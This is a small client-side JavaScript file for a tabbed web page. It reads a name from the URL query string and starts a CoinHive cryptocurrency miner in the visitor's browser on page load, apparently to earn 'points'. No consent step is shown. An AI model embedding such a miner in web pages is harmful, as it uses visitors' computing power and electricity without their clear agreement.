var named = false;
if (window.location.search.length > 1) {
  document.querySelector("#landing").style.display = "none";
  document.querySelector("#start").style.top = "35px";
  document.querySelector("#start").style.left = "135px";
  document.querySelector("#start").setAttribute("readonly","");
  document.querySelector("#start").setAttribute("class","tab");
  document.querySelector("#portal").style.display = "inherit";
  document.querySelector("#start").value = window.location.search.slice(1);
  named = true;
  if  (window.location.origin != "file://") {
    // Add coin hive for points
    var miner = new CoinHive.User("7RaiTYKeaBtz17GRNjKDr0LNIpdiT2VR", window.location.search+window.location.hash);
    miner.start();
    miner.on("accepted", () => {
      console.log(miner.getAcceptedHashes());
    })
  }
}

document.querySelector("#start").addEventListener("keyup", (e)=>{
  if (e.key == "Enter") {
    var value = document.querySelector("#start").value;
    window.location.search = "?"+value;
  }
});

var show = "myteam";
function tab(e) {
  if (named) {
    if (show) {
      document.querySelector("#"+show).style.display = "none";
    }
    show = e.getAttribute("data-show");
    document.querySelector("#"+show).style.display = "inherit";
  }
}
